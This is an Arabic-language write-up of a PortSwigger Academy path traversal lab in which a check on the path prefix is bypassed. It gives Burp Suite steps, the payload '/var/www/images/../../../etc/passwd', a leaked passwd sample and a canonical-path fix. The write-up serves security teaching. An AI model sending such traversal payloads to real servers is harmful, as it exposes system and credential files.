# Lab 05 — Validation of Start of Path (تجاوز شرط بداية المسار)

[![التصنيف](https://img.shields.io/badge/الفئة-Path%20Traversal-purple)]()
[![النوع](https://img.shields.io/badge/النوع-Path%20Traversal%20—%20Prefix%20Validation%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> هذا الشرح جزء من سلسلة [معامل اجتياز المسارات (Path Traversal)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 05 — Validation of Start of Path (تجاوز شرط بداية المسار) |
| **تصنيف الثغرة** | Path Traversal — Prefix Validation Bypass |
| **معيار الضعف (CWE)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | تجاوز فلتر يتحقق من أن المسار يبدأ بـ /var/www/images. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

وضع المطور هنا كود فحص يتأكد من أن القيمة المدخلة تبدأ بالمسار المسموح: `if (!input.startsWith("/var/www/images/")) { reject(); }`.

**الخلل الفكري هنا:** الفحص يدقق فقط في الحروف الأولى من النص، ولا يتحقق من أين ينتهي المسار بعد فك رموزه! يستطيع المهاجم إعطاء السيرفر البداية التي يريدها، ثم إلحاق تتابعات الهروب `../../../etc/passwd` مباشرة بعدها. سيمر الفحص لأن النص يبدأ فعلاً بالبادئة المطلوبة، ثم يقوم نظام الملفات بالرجوع للخلف وقراءة الملف السري.

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يرضي شرط البادئة المكتوب بحسابات نصية بسيطة، ثم يلحق به `../` للهروب من المجلد.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور فحص النص الظاهري قبل حل المسار القياسي بدلاً من فحص المسار الفعلي بعد الـ Canonicalization.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. اعترض طلب الصورة في Burp Suite وأرسله إلى **Repeater**.
2. لاحظ أن الطلب يرسل اسم الملف مع مساره:
`GET /image?filename=/var/www/images/53.jpg HTTP/1.1`.
3. احتفظ بالمسار الأولي كما هو، ثم أضف بعده تتابعات الهروب:
`filename=/var/www/images/../../../etc/passwd`.
4. اضغط Send، ستجد أن السيرفر سمح بالطلب لأن بدايته مطابقة للشرط، وعرض محتويات `/etc/passwd`!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

قراءة ملفات النظام الحساسة بالالتفاف على فلاتر التحقق من البادئة.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

استخدام دالة `getCanonicalPath()` للتأكد من أن المسار النهائي المحلول يقع داخل المجلد وليس مجرد فحص نصي للبداية.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
